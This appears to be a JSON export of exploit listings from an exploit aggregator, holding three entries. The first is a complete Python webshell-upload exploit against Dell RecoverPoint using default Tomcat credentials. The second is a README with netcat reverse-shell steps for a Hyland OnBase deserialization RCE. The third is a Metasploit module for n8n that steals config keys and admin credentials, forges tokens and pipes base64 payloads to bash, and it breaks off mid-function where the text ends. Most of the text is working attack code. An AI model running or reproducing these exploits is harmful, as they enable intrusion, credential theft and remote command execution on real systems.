{
    "exploits": [
        {
            "title": "\ud83d\udcc4 Dell RecoverPoint for Virtual Machines Shell Upload",
            "score": 10.0,
            "href": "https://packetstorm.news/download/215955",
            "type": "packetstorm",
            "published": "2026-02-20",
            "id": "PACKETSTORM:215955",
            "source": "## https://sploitus.com/exploit?id=PACKETSTORM:215955\n=============================================================================================================================================\n    | # Title     : Dell RecoverPoint for Virtual Machines RCE                                                                                  |\n    | # Author    : indoushka                                                                                                                   |\n    | # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |\n    | # Vendor    : https://www.dell.com/en-us/lp/dt/data-protection-suite-recoverpoint-for-virtual-machines                                    |\n    =============================================================================================================================================\n    \n    [+] Summary    :  PoC exploiteert standaard Tomcat Manager credentials (admin:admin) om een kwaadaardig WAR-bestand met een JSP-webshell te uploaden en uitvoeren op Dell RecoverPoint-appliances. \n                      Dit kan leiden tot volledige remote code execution (RCE) en ongeautoriseerde toegang tot systeem- en applicatiegegevens. \n                      Preventie omvat het verwijderen van standaardaccounts, beperken van Tomcat Manager-toegang, sterke wachtwoorden en monitoring van deployment logs.\n    \n    [+] POC   :\n    \n    #!/usr/bin/env python3\n    \n    import requests\n    import sys\n    import base64\n    import argparse\n    from requests.packages.urllib3.exceptions import InsecureRequestWarning\n    \n    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n    \n    # Default credentials found in /home/kos/tomcat9/tomcat-users.xml\n    DEFAULT_USERNAME = \"admin\"\n    DEFAULT_PASSWORD = \"admin\"  # or whatever the hardcoded default is - adjust based on actual discovery\n    \n    JSP_WEBSHELL = '''\n    <%@ page import=\"java.util.*,java.io.*\"%>\n    <%\n        if (request.getParameter(\"cmd\") != null) {\n            Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n            OutputStream os = p.getOutputStream();\n            InputStream in = p.getInputStream();\n            DataInputStream dis = new DataInputStream(in);\n            String disr = dis.readLine();\n            while (disr != null) {\n                out.println(disr);\n                disr = dis.readLine();\n            }\n        }\n    %>\n    '''\n    \n    def create_malicious_war(war_name=\"shell.war\", shell_name=\"shell.jsp\"):\n        \"\"\"\n        Creates a simple WAR file containing a JSP webshell\n        \"\"\"\n        import tempfile\n        import os\n        import zipfile\n        import uuid\n        \n        temp_dir = tempfile.mkdtemp()\n        war_path = os.path.join(temp_dir, war_name)\n    \n        web_inf = os.path.join(temp_dir, \"WEB-INF\")\n        os.makedirs(web_inf, exist_ok=True)\n    \n        web_xml = os.path.join(web_inf, \"web.xml\")\n        with open(web_xml, 'w') as f:\n            f.write('''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <web-app xmlns=\"http://java.sun.com/xml/ns/javaee\"\n             xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n             xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee \n                                 http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\"\n             version=\"3.0\">\n        <display-name>Malicious</display-name>\n        <welcome-file-list>\n            <welcome-file>shell.jsp</welcome-file>\n        </welcome-file-list>\n    </web-app>''')\n    \n        jsp_path = os.path.join(temp_dir, shell_name)\n        with open(jsp_path, 'w') as f:\n            f.write(JSP_WEBSHELL)\n    \n        with zipfile.ZipFile(war_path, 'w', zipfile.ZIP_DEFLATED) as war:\n    \n            war.write(web_xml, arcname=\"WEB-INF/web.xml\")\n            war.write(jsp_path, arcname=shell_name)\n        \n        return war_path\n    \n    def exploit(target_url, war_file, deploy_path=\"/shell\"):\n        \"\"\"\n        Exploit the vulnerability by uploading and deploying malicious WAR\n        \"\"\"\n        print(f\"[*] Targeting: {target_url}\")\n        print(f\"[*] Using default credentials: {DEFAULT_USERNAME}:{DEFAULT_PASSWORD}\")\n    \n        session = requests.Session()\n        session.auth = (DEFAULT_USERNAME, DEFAULT_PASSWORD)\n        session.verify = False \n    \n        try:\n            status_url = f\"{target_url}/manager/status\"\n            r = session.get(status_url, timeout=10)\n            if r.status_code == 200:\n                print(\"[+] Authentication successful! Default credentials work.\")\n            elif r.status_code == 401:\n                print(\"[-] Authentication failed. Default credentials rejected.\")\n                return False\n            else:\n                print(f\"[?] Unexpected response code: {r.status_code}\")\n        except requests.exceptions.RequestException as e:\n            print(f\"[-] Connection error: {e}\")\n            return False\n    \n        print(f\"[*] Uploading malicious WAR to {deploy_path}\")\n        \n        deploy_url = f\"{target_url}/manager/text/deploy\"\n        \n        with open(war_file, 'rb') as f:\n            war_content = f.read()\n    \n        files = {\n            'file': (war_file, war_content, 'application/octet-stream')\n        }\n        \n        params = {\n            'path': deploy_path,\n            'update': 'true'\n        }\n        \n        try:\n            r = session.put(deploy_url, params=params, files=files, timeout=30)\n            \n            if r.status_code == 200:\n                print(f\"[+] WAR deployed successfully to {deploy_path}\")\n                print(f\"[+] Web shell available at: {target_url}{deploy_path}/shell.jsp\")\n                print(\"[*] Example command: curl -k '{}{}/shell.jsp?cmd=id'\".format(\n                    target_url, deploy_path))\n                return True\n            else:\n                print(f\"[-] Deployment failed. Response code: {r.status_code}\")\n                print(f\"[-] Response body: {r.text[:200]}\")\n                return False\n                \n        except requests.exceptions.RequestException as e:\n            print(f\"[-] Error during deployment: {e}\")\n            return False\n    \n    def interactive_shell(target_url, shell_path):\n        \"\"\"\n        Simple interactive shell via the uploaded JSP webshell\n        \"\"\"\n        print(\"[*] Entering interactive shell (type 'exit' to quit)\")\n        \n        while True:\n            cmd = input(\"$> \")\n            if cmd.lower() == 'exit':\n                break\n            \n            params = {'cmd': cmd}\n            try:\n                r = requests.get(f\"{target_url}{shell_path}\", params=params, \n                               verify=False, timeout=10)\n                if r.status_code == 200:\n                    print(r.text.strip())\n                else:\n                    print(f\"[-] Command failed: HTTP {r.status_code}\")\n            except requests.exceptions.RequestException as e:\n                print(f\"[-] Error: {e}\")\n    \n    def main():\n        parser = argparse.ArgumentParser(description='CVE-2026-22769 PoC Exploit By indoushka')\n        parser.add_argument('target', help='Target URL (e.g., https://192.168.1.100:8443)')\n        parser.add_argument('--deploy-path', default='/shell', \n                           help='Deployment path for WAR (default: /shell)')\n        parser.add_argument('--interactive', '-i', action='store_true',\n                           help='Launch interactive shell after exploitation')\n        \n        args = parser.parse_args()\n        \n        print(\"=== CVE-2026-22769 Dell RecoverPoint RCE PoC By indoushka ===\")\n        print(\"Based on Mandiant/GTIG research\\n\")\n    \n        print(\"[*] Creating malicious WAR payload...\")\n        war_file = create_malicious_war()\n        print(f\"[+] WAR created: {war_file}\")\n    \n        if exploit(args.target, war_file, args.deploy_path):\n            print(\"\\n[+] Exploit successful!\")\n            \n            if args.interactive:\n                shell_url = f\"{args.target}{args.deploy_path}/shell.jsp\"\n                interactive_shell(args.target, f\"{args.deploy_path}/shell.jsp\")\n        else:\n            print(\"\\n[-] Exploit failed.\")\n    \n        print(\"\\n[*] Note: The created WAR file remains on the target\")\n        print(\"[*] Location: /var/lib/tomcat9\")\n    \n    if __name__ == \"__main__\":\n        main()\n    \t\n    Greetings to :======================================================================\n    jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|\n    ====================================================================================",
            "language": "python"
        },
        {
            "title": "Exploit for CVE-2026-26221",
            "score": 10.0,
            "href": "https://github.com/mbanyamer/CVE-2026-26221-Hyland-OnBase-Timer-Service-Unauthenticated-RCE",
            "type": "githubexploit",
            "published": "2026-02-18",
            "id": "D4C54331-77A8-53D4-8152-CDEA00DEF4A5",
            "source": "## https://sploitus.com/exploit?id=D4C54331-77A8-53D4-8152-CDEA00DEF4A5\n# \ud83d\udce1 Hyland OnBase Timer Service Unauthenticated RCE\n\n\n\n## Mohammed Idrees Banyamer \n\n### Security Researcher\n\n**Jordan \ud83c\uddef\ud83c\uddf4**\n\n![Author](https://img.shields.io/badge/Author-Mohammed%20Idrees%20Banyamer-red)\n![Role](https://img.shields.io/badge/Role-Security%20Researcher-blue)\n![Country](https://img.shields.io/badge/Country-Jordan-black)\n![Platform](https://img.shields.io/badge/Platform-Windows-blue)\n![Vulnerability](https://img.shields.io/badge/Vuln-.NET%20Remoting%20Deserialization-critical)\n![CVE](https://img.shields.io/badge/CVE-2026--26221-orange)\n![CVSS](https://img.shields.io/badge/CVSS-9.8-critical)\n![Status](https://img.shields.io/badge/Exploit-PoC-success)\n\n\n\n---\n\n## \ud83e\udde8 Overview\n\nThis repository contains a Proof\u2011of\u2011Concept exploit for **Hyland OnBase Timer Service** unauthenticated remote code execution vulnerability via insecure **.NET Remoting BinaryFormatter deserialization**.\n\nThe vulnerability allows an unauthenticated attacker to send a crafted BinaryFormatter payload to the Timer Service endpoint and execute arbitrary code as **NT AUTHORITY\\SYSTEM**.\n\n* **Product:** Hyland OnBase Workflow / Workview Timer Service\n* **Port:** 8900/TCP\n* **Auth:** Not required\n* **Impact:** Remote Code Execution\n* **Privileges:** SYSTEM\n* **CVE:** CVE\u20112026\u201126221\n* **CVSS:** 9.8 (Critical)\n\n---\n\n## \u2699\ufe0f Technical Details\n\nThe Timer Service exposes a .NET Remoting endpoint:\n\n```\nhttp://TARGET:8900/TimerServiceAPI.rem\n```\n\nThe service accepts unauthenticated BinaryFormatter objects.\nBy supplying a malicious gadget chain (ysoserial.net), arbitrary command execution occurs during deserialization.\n\n---\n\n## \ud83d\udce6 Requirements\n\n* Python 3\n* requests\n* ysoserial.net\n* netcat listener\n* Windows payload generation environment (Windows / Mono / Wine)\n\nInstall Python dependency:\n\n```bash\npip install requests\n```\n\nDownload ysoserial.net:\n\n```bash\ngit clone https://github.com/pwntester/ysoserial.net\n```\n\n---\n\n## \ud83d\ude80 Usage\n\n### 1\ufe0f\u20e3 Start Listener\n\n```bash\nnc -lvnp 4444\n```\n\n---\n\n### 2\ufe0f\u20e3 Run Exploit\n\n```bash\npython3 exploit.py 192.168.10.50 --lhost 192.168.1.100 --lport 4444\n```\n\n---\n\n### 3\ufe0f\u20e3 Generate Payload\n\nThe script prints a ysoserial command.\nRun it in another terminal (Windows / Mono):\n\n```bash\nysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"powershell ...\" -o raw > rev_shell.bin\n```\n\n---\n\n### 4\ufe0f\u20e3 Send Payload\n\nPress ENTER in exploit terminal after payload generation.\n\nIf vulnerable \u2192 reverse shell connects.\n\n---\n\n## \ud83e\uddea Example\n\n```bash\npython3 exploit.py 10.10.10.123 --lhost 192.168.5.77 --lport 9001\n```\n\n---\n\n## \ud83d\udd27 Options\n\n| Option     | Description                                  |\n| ---------- | -------------------------------------------- |\n| target     | Target IP or hostname                        |\n| --port     | Timer Service port (default 8900)            |\n| --endpoint | TimerServiceAPI.rem / TimerServiceEvents.rem |\n| --lhost    | Attacker IP                                  |\n| --lport    | Listener port                                |\n| --gadget   | ysoserial gadget chain                       |\n\n---\n\n## \ud83e\uddef Notes\n\n* Exploit is **blind**\n* Success = reverse shell callback\n* Service runs as SYSTEM\n* Try alternate gadget if blocked:\n\n  * TextFormattingRunProperties\n  * ObjectDataProvider\n\n---\n\n## \ud83d\udee1\ufe0f Mitigation\n\n* Apply Hyland security advisory OB2025\u201103 patches\n* Disable .NET Remoting exposure\n* Restrict port 8900 access\n* Monitor BinaryFormatter usage\n\n---\n\n## \ud83d\udcca PoC Attack Flow\n\n```mermaid\nsequenceDiagram\n    participant A as Attacker\n    participant Y as ysoserial.net\n    participant T as Target OnBase Timer Service\n    participant S as SYSTEM Shell\n\n    A->>A: Start netcat listener\n    A->>Y: Generate BinaryFormatter payload\n    Y-->>A: rev_shell.bin\n    A->>T: HTTP POST /TimerServiceAPI.rem\n    T->>T: BinaryFormatter.Deserialize()\n    T->>S: Execute gadget chain\n    S-->>A: Reverse shell connection\n```\n\n---\n\n## \u26a0\ufe0f Disclaimer\n\nThis exploit is provided for:\n\n* Security research\n* Authorized penetration testing\n* Defensive validation\n\nUnauthorized use against systems you do not own or have permission to test is illegal.\n\n---",
            "language": "MARKDOWN"
        },
        {
            "title": "\ud83d\udcc4 n8n Workflow Automation Remote Configuration / Admin Data Extraction",
            "score": 10.0,
            "href": "https://packetstorm.news/download/215730",
            "type": "packetstorm",
            "published": "2026-02-17",
            "id": "PACKETSTORM:215730",
            "source": "## https://sploitus.com/exploit?id=PACKETSTORM:215730\n=============================================================================================================================================\n    | # Title     : n8n Workflow Automation - Remote Configuration & Admin Data Extraction                                                      |\n    | # Author    : indoushka                                                                                                                   |\n    | # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |\n    | # Vendor    : https://n8n.io/                                                                                                             |\n    =============================================================================================================================================\n    \n    [+] Summary    : This Metasploit module demonstrates a proof-of-concept (PoC) for exploiting misconfigurations in n8n workflow automation instances. It shows how an attacker could potentially:\n    \n    Read configuration files containing sensitive data (e.g., encryption keys).\n    \n    Extract administrator credentials from the SQLite database.\n    \n    Generate authentication tokens for privileged access.\n    \n    Optionally create and execute workflows to run commands (PoC only; not for real attacks).\n    \n    The module is intended for security research, penetration testing with explicit authorization, and vulnerability reporting. It includes safe error handling, retries, and cleanup procedures to minimize system impact.\n    \n    [+] POC : \n    \n    ##\n    # This module requires Metasploit: https://metasploit.com/download\n    # Current source: https://github.com/rapid7/metasploit-framework\n    ##\n    \n    require 'jwt'\n    require 'sqlite3'\n    require 'base64'\n    require 'digest'\n    require 'tempfile'\n    \n    class MetasploitModule < Msf::Exploit::Remote\n      Rank = ManualRanking\n    \n      include Msf::Exploit::Remote::HttpClient\n      include Msf::Exploit::CmdStager\n      include Msf::Auxiliary::Report\n    \n      def initialize(info = {})\n        super(\n          update_info(\n            info,\n            'Name' => 'n8n Unauthenticated Remote Code Execution',\n            'Description' => %q{\n              This module exploits multiple vulnerabilities in n8n workflow automation tool.\n              It leverages a file read vulnerability to steal encryption keys and database,\n              then uses stolen credentials to authenticate and execute arbitrary commands\n              via the Execute Command node.\n            },\n            'Author' => [\n              'indoushka'\n            ],\n            'License' => MSF_LICENSE,\n            'References' => [\n              ['CVE', '2026-21858'],\n              ['URL', 'https://n8n.io']\n            ],\n            'Privileged' => false,\n            'Platform' => ['linux', 'unix'],\n            'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n            'Targets' => [\n              [\n                'Linux Command',\n                {\n                  'Arch' => ARCH_CMD,\n                  'Platform' => 'unix',\n                  'DefaultOptions' => {\n                    'PAYLOAD' => 'cmd/unix/reverse_bash'\n                  }\n                }\n              ],\n              [\n                'Linux Dropper',\n                {\n                  'Arch' => [ARCH_X86, ARCH_X64],\n                  'Platform' => 'linux',\n                  'DefaultOptions' => {\n                    'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n                  }\n                }\n              ]\n            ],\n            'DefaultTarget' => 0,\n            'DisclosureDate' => '2026-02-14',\n            'Notes' => {\n              'Stability' => [CRASH_SAFE],\n              'Reliability' => [REPEATABLE_SESSION],\n              'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n            }\n          )\n        )\n    \n        register_options(\n          [\n            OptString.new('TARGETURI', [true, 'The base path to n8n', '/']),\n            OptString.new('FORM_PATH', [true, 'Path to the vulnerable form endpoint', '/form/']),\n            OptString.new('HOME_DIR', [true, 'n8n home directory', '/home/n8n']),\n            OptString.new('BROWSER_ID', [false, 'Browser ID for session', 'msf_browser_' + Rex::Text.rand_text_alphanumeric(8)]),\n            OptInt.new('WAIT_TIME', [true, 'Time to wait between requests', 5]),\n            OptBool.new('FOLLOW_REDIRECT', [true, 'Follow HTTP redirects', true]),\n            OptBool.new('CLEANUP', [true, 'Attempt to clean up created workflows', true]),\n            OptInt.new('RETRY_COUNT', [true, 'Number of retries for failed requests', 3]),\n            OptEnum.new('PAYLOAD_METHOD', [true, 'Method to execute payload', 'auto', ['auto', 'bash', 'sh', 'python3', 'python']])\n          ]\n        )\n      end\n    \n      def ensure_payload_loaded\n        unless payload\n          print_error(\"No payload configured. Use 'set PAYLOAD <payload>'\")\n          return false\n        end\n        true\n      end\n    \n      def parse_json_response(response, context = 'response')\n        return [nil, \"No response to parse\"] unless response\n        \n        begin\n          json_data = JSON.parse(response.body)\n          return [json_data, nil]\n        rescue JSON::ParserError => e\n          error_msg = \"Failed to parse JSON from #{context}: #{e.message}\"\n          if datastore['VERBOSE'] && response.body\n            print_warning(\"Raw response (first 200 chars): #{response.body[0..200]}\")\n          end\n          return [nil, error_msg]\n        end\n      end\n    \n      def send_request_with_retry(opts, expected_codes = [200])\n        retries = 0\n        expected_codes = [expected_codes] unless expected_codes.is_a?(Array)\n        \n        begin\n          opts['follow_redirect'] = datastore['FOLLOW_REDIRECT'] unless opts.key?('follow_redirect')\n          res = send_request_cgi(opts)\n    \n          unless res\n            retries += 1\n            if retries < datastore['RETRY_COUNT']\n              vprint_warning(\"Request failed (no response), retrying (#{retries}/#{datastore['RETRY_COUNT']})...\")\n              sleep(1)\n              retry\n            else\n              return [nil, \"No response after #{retries} retries\"]\n            end\n          end\n    \n          if expected_codes.include?(res.code)\n            return [res, nil]\n          else\n            retries += 1\n            if retries < datastore['RETRY_COUNT']\n              vprint_warning(\"Request returned HTTP #{res.code} (expected #{expected_codes.join(', ')}), retrying...\")\n              sleep(1)\n              retry\n            else\n              return [res, \"Unexpected HTTP code: #{res.code} (expected #{expected_codes.join(', ')})\"]\n            end\n          end\n          \n        rescue => e\n          retries += 1\n          if retries < datastore['RETRY_COUNT']\n            vprint_warning(\"Request error: #{e.message}, retrying (#{retries}/#{datastore['RETRY_COUNT']})...\")\n            sleep(1)\n            retry\n          else\n            return [nil, \"Request failed after #{retries} retries: #{e.message}\"]\n          end\n        end\n      end\n    \n      def read_file_via_form(filepath)\n        begin\n          base_uri = datastore['TARGETURI']\n          base_uri = '/' if base_uri.empty?\n          \n          form_uri = normalize_uri(base_uri, datastore['FORM_PATH'])\n          \n          payload = {\n            'data' => {},\n            'files' => {\n              'file' => {\n                'filepath' => filepath,\n                'originalFilename' => 'pwn.txt'\n              }\n            }\n          }.to_json\n    \n          vprint_status(\"Attempting to read: #{filepath}\")\n          \n          res, error = send_request_with_retry({\n            'method' => 'POST',\n            'uri' => form_uri,\n            'ctype' => 'application/json',\n            'data' => payload\n          }, 200)\n    \n          unless res\n            print_error(\"Failed to read #{filepath}: #{error}\")\n            return nil\n          end\n    \n          json_res, parse_error = parse_json_response(res, \"file read POST response\")\n          \n          if parse_error\n            print_error(\"Failed to parse response for #{filepath}: #{parse_error}\")\n            return nil\n          end\n    \n          waiting_url = json_res&.dig('formWaitingUrl')\n          \n          unless waiting_url\n            print_error(\"No formWaitingUrl in response for #{filepath}\")\n            return nil\n          end\n    \n          vprint_good(\"Successfully triggered file read for #{filepath}\")\n          sleep(datastore['WAIT_TIME'])\n          \n          parsed_uri = URI.parse(waiting_url)\n          file_res, file_error = send_request_with_retry({\n            'method' => 'GET',\n            'uri' => parsed_uri.path,\n            'query' => parsed_uri.query\n          }, 200)\n          \n          if file_res\n            vprint_good(\"Successfully retrieved #{filepath} (#{file_res.body.length} bytes)\")\n            return file_res.body\n          else\n            print_error(\"Failed to retrieve file content for #{filepath}: #{file_error}\")\n            return nil\n          end\n          \n        rescue => e\n          print_error(\"Unexpected error reading #{filepath}: #{e.message}\")\n          print_error(\"Backtrace: #{e.backtrace.join(\"\\n\")}\") if datastore['VERBOSE']\n          return nil\n        end\n      end\n    \n      def extract_encryption_key(config_data)\n        begin\n          if config_data =~ /\"encryptionKey\"\\s*:\\s*\"([^\"]+)\"/\n            enc_key = $1\n            print_good(\"Found encryption key: #{enc_key}\")\n    \n            every_other = (0...enc_key.length).step(2).map { |i| enc_key[i] }.join\n            final_secret = Digest::SHA256.hexdigest(every_other)\n            vprint_good(\"Generated final secret: #{final_secret}\")\n            \n            return final_secret\n          else\n            print_error(\"Could not find encryptionKey in config file\")\n            return nil\n          end\n        rescue => e\n          print_error(\"Error extracting encryption key: #{e.message}\")\n          return nil\n        end\n      end\n    \n      def extract_admin_data_sqlite(db_content)\n        temp_file = nil\n        db = nil\n        \n        begin\n    \n          temp_file = Tempfile.new(['n8n_db', '.sqlite'])\n          temp_file.binmode\n          temp_file.write(db_content)\n          temp_file.close\n          \n          db = SQLite3::Database.new(temp_file.path)\n          db.results_as_hash = true\n    \n          tables = db.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")\n          table_names = tables.map { |t| t['name'] }\n          \n          unless table_names.include?('user')\n            print_warning(\"No 'user' table found in database. Available tables: #{table_names.join(', ')}\")\n            return nil\n          end\n    \n          columns = db.execute(\"PRAGMA table_info(user)\")\n          column_names = columns.map { |c| c['name'] }\n          vprint_status(\"User table columns: #{column_names.join(', ')}\")\n    \n          id_column = column_names.include?('id') ? 'id' : nil\n          email_column = column_names.include?('email') ? 'email' : nil\n          password_column = column_names.include?('password') ? 'password' : nil\n          \n          unless id_column && email_column && password_column\n            print_error(\"Required columns not found in user table\")\n            return nil\n          end\n    \n          role_columns = column_names.select { |c| c.include?('role') }\n          \n          admin_query = nil\n          \n          if role_columns.any?\n            role_col = role_columns.first\n            admin_query = \"SELECT #{id_column}, #{email_column}, #{password_column} FROM user WHERE #{role_col} IN ('global:owner', 'global:admin', 'owner', 'admin') LIMIT 1\"\n          else\n    \n            admin_query = \"SELECT #{id_column}, #{email_column}, #{password_column} FROM user ORDER BY createdAt ASC LIMIT 1\"\n          end\n          \n          users = db.execute(admin_query)\n          \n          if users.any?\n            admin_id = users[0][id_column].to_s\n            admin_email = users[0][email_column]\n            admin_password = users[0][password_column]\n            \n            print_good(\"Found admin via SQLite: #{admin_email} (ID: #{admin_id})\")\n    \n            combined = \"#{admin_email}:#{admin_password}\"\n            sha256_digest = Digest::SHA256.digest(combined)\n            admin_hash = Base64.strict_encode64(sha256_digest)[0..9]\n            vprint_good(\"Generated admin hash: #{admin_hash}\")\n            \n            return {\n              'admin_id' => admin_id,\n              'admin_email' => admin_email,\n              'admin_password_hash' => admin_password,\n              'admin_hash' => admin_hash\n            }\n          else\n            print_warning(\"No admin users found in database\")\n            return nil\n          end\n          \n        rescue SQLite3::Exception => e\n          print_error(\"SQLite parsing failed: #{e.message}\")\n          return nil\n        rescue => e\n          print_error(\"Error parsing SQLite: #{e.message}\")\n          return nil\n        ensure\n          db&.close if db\n          if temp_file\n            temp_file.close\n            temp_file.unlink\n          end\n        end\n      end\n    \n      def create_session_token(secret, admin_id, admin_hash)\n        begin\n          browser_id = datastore['BROWSER_ID']\n          hashed_browser = Base64.strict_encode64(Digest::SHA256.digest(browser_id))\n          \n          payload = {\n            'id' => admin_id,\n            'hash' => admin_hash,\n            'browserId' => hashed_browser,\n            'usedMfa' => false,\n            'iat' => Time.now.to_i,\n            'exp' => Time.now.to_i + 86400\n          }\n          \n          token = JWT.encode(payload, secret, 'HS256')\n          vprint_good(\"Created authentication token: #{token[0..30]}...\")\n          \n          return token\n        rescue => e\n          print_error(\"Failed to create JWT token: #{e.message}\")\n          return nil\n        end\n      end\n    \n      def create_workflow(token, command)\n        begin\n          base_uri = datastore['TARGETURI']\n          base_uri = '/' if base_uri.empty?\n          \n          workflow_name = \"exploit_#{Rex::Text.rand_text_numeric(6)}\"\n          node_id = \"node_#{Rex::Text.rand_text_alphanumeric(8)}\"\n          \n          workflow_data = {\n            'name' => workflow_name,\n            'active' => false,\n            'nodes' => [\n              {\n                'parameters' => {\n                  'command' => command\n                },\n                'name' => 'Execute Command',\n                'type' => 'n8n-nodes-base.executeCommand',\n                'typeVersion' => 1,\n                'position' => [250, 250],\n                'id' => node_id\n              }\n            ],\n            'connections' => {}\n          }.to_json\n          \n          res, error = send_request_with_retry({\n            'method' => 'POST',\n            'uri' => normalize_uri(base_uri, 'rest', 'workflows'),\n            'ctype' => 'application/json',\n            'headers' => {\n              'browser-id' => datastore['BROWSER_ID']\n            },\n            'cookie' => \"n8n-auth=#{token}\",\n            'data' => workflow_data\n          }, 200)\n          \n          unless res\n            print_error(\"Failed to create workflow: #{error}\")\n            return nil\n          end\n          \n          json_res, parse_error = parse_json_response(res, \"workflow creation\")\n          \n          if parse_error\n            print_error(\"Failed to parse workflow creation response: #{parse_error}\")\n            return nil\n          end\n          \n          workflow_id = json_res&.dig('data', 'id')\n          \n          unless workflow_id\n            print_error(\"No workflow ID in response\")\n            return nil\n          end\n          \n          print_good(\"Created workflow: #{workflow_id}\")\n          return json_res['data']\n          \n        rescue => e\n          print_error(\"Error creating workflow: #{e.message}\")\n          return nil\n        end\n      end\n    \n      def execute_workflow(token, workflow_info)\n        begin\n          return [nil, \"No workflow info\"] unless workflow_info&.dig('id')\n          \n          base_uri = datastore['TARGETURI']\n          base_uri = '/' if base_uri.empty?\n          \n          workflow_id = workflow_info['id']\n          \n          run_res, run_error = send_request_with_retry({\n            'method' => 'POST',\n            'uri' => normalize_uri(base_uri, 'rest', 'workflows', workflow_id, 'run'),\n            'ctype' => 'application/json',\n            'headers' => {\n              'browser-id' => datastore['BROWSER_ID']\n            },\n            'cookie' => \"n8n-auth=#{token}\",\n            'data' => { 'workflowData' => workflow_info }.to_json\n          }, 200)\n          \n          unless run_res\n            return [nil, \"Failed to execute workflow: #{run_error}\"]\n          end\n          \n          json_res, parse_error = parse_json_response(run_res, \"execution\")\n          \n          if parse_error\n            return [nil, \"Failed to parse execution response: #{parse_error}\"]\n          end\n          \n          execution_id = json_res&.dig('data', 'executionId')\n          \n          unless execution_id\n            return [nil, \"No execution ID in response\"]\n          end\n          \n          vprint_good(\"Executed workflow, execution ID: #{execution_id}\")\n    \n          sleep(2)\n          \n          result_res, result_error = send_request_with_retry({\n            'method' => 'GET',\n            'uri' => normalize_uri(base_uri, 'rest', 'executions', execution_id),\n            'ctype' => 'application/json',\n            'headers' => {\n              'browser-id' => datastore['BROWSER_ID']\n            },\n            'cookie' => \"n8n-auth=#{token}\"\n          }, 200)\n          \n          unless result_res\n            return [nil, \"Failed to get execution result: #{result_error}\"]\n          end\n          \n          json_res, parse_error = parse_json_response(result_res, \"execution result\")\n          \n          if parse_error\n            return [nil, \"Failed to parse execution result: #{parse_error}\"]\n          end\n          \n          raw_data = json_res&.dig('data', 'data')\n          \n          unless raw_data\n            return [nil, \"No data in execution result\"]\n          end\n          \n          begin\n            exec_data = JSON.parse(raw_data)\n            output = extract_command_output(exec_data)\n            return [output, nil]\n          rescue JSON::ParserError\n            return [raw_data, nil]\n          end\n          \n        rescue => e\n          return [nil, \"Error executing workflow: #{e.message}\"]\n        end\n      end\n    \n      def extract_command_output(exec_data)\n        if exec_data.is_a?(Array)\n          exec_data.reverse.each do |item|\n            if item.is_a?(String) && !item.empty? && item != 'Execute Command' && !item.start_with?('node-')\n              return item.strip\n            end\n          end\n        end\n        \"No output captured\"\n      end\n    \n      def cleanup_workflows(token, workflow_ids)\n        return unless datastore['CLEANUP'] && workflow_ids&.any?\n        \n        print_status(\"Cleaning up #{workflow_ids.length} workflows...\")\n        \n        base_uri = datastore['TARGETURI']\n        base_uri = '/' if base_uri.empty?\n        \n        workflow_ids.each do |wf_id|\n          begin\n            res, error = send_request_with_retry({\n              'method' => 'DELETE',\n              'uri' => normalize_uri(base_uri, 'rest', 'workflows', wf_id),\n              'headers' => {\n                'browser-id' => datastore['BROWSER_ID']\n              },\n              'cookie' => \"n8n-auth=#{token}\"\n            }, [200, 204, 404]) # 404 \u064a\u0639\u0646\u064a \u0623\u0646\u0647 \u0645\u062d\u0630\u0648\u0641 \u0628\u0627\u0644\u0641\u0639\u0644\n            \n            if res && (res.code == 200 || res.code == 204)\n              print_status(\"Cleaned up workflow: #{wf_id}\")\n            elsif res && res.code == 404\n              print_status(\"Workflow #{wf_id} already deleted\")\n            else\n              print_warning(\"Failed to delete workflow #{wf_id}: #{error}\")\n            end\n          rescue => e\n            print_warning(\"Error during cleanup of workflow #{wf_id}: #{e.message}\")\n          end\n        end\n      end\n    \n      def check\n        begin\n    \n          test_file = \"#{datastore['HOME_DIR']}/.n8n/config\"\n          data = read_file_via_form(test_file)\n          \n          if data && data.include?('encryptionKey')\n            print_good(\"Target appears vulnerable - found encryption key in config\")\n            return Exploit::CheckCode::Vulnerable\n          end\n          \n          return Exploit::CheckCode::Safe\n          \n        rescue => e\n          print_error(\"Error during check: #{e.message}\")\n          return Exploit::CheckCode::Unknown\n        end\n      end\n    \n      def select_payload_method\n        method = datastore['PAYLOAD_METHOD']\n        \n        if method == 'auto'\n    \n          [\n            ['bash', 'bash -c'],\n            ['sh', 'sh -c'],\n            ['python3', 'python3 -c'],\n            ['python', 'python -c']\n          ].each do |name, _|\n            return name\n          end\n          return 'bash' \n        end\n        \n        method\n      end\n    \n      def generate_compatible_payload\n        unless ensure_payload_loaded\n          return nil\n        end\n        \n        case target['Arch']\n        when ARCH_CMD\n          command = payload.encoded\n    \n          if command.length > 1000\n            print_warning(\"Command payload is very long (#{command.length} chars)\")\n          end\n          vprint_status(\"Using command payload\")\n          return command\n          \n        else\n    \n          payload_b64 = Rex::Text.encode_base64(payload.encoded)\n          method = select_payload_method\n          \n          commands = {\n            'bash' => \"echo #{payload_b64} | base64 -d | bash\",\n            'sh' => \"echo #{payload_b64} | base64 -d | sh\",\n            'python3' => \"echo #{payload_b64} | python3 -c 'import base64,sys; exec(base64.b64decode(sys.stdin.read()))'\",\n            'python' => \"echo #{payload_b64} | python -c 'import base64,sys; exec(base64.b64decode(sys.stdin.read()))'\"\n          }\n          \n          selected_command = commands[method]\n          \n          if selected_command\n            print_status(\"Using #{method} method for payload execution\")\n            return selected_command\n          else\n    \n            print_warning(\"Unknown method #{method}, falling back to bash\")\n            return commands['bash']\n          end\n        end\n      end\n    \n      def exploit\n        print_status(\"Starting n8n exploitation...\")\n    \n        unless ensure_payload_loaded\n          return\n        end\n        \n        created_workflows = []\n        token = nil\n        admin_data = nil\n        secret = nil\n    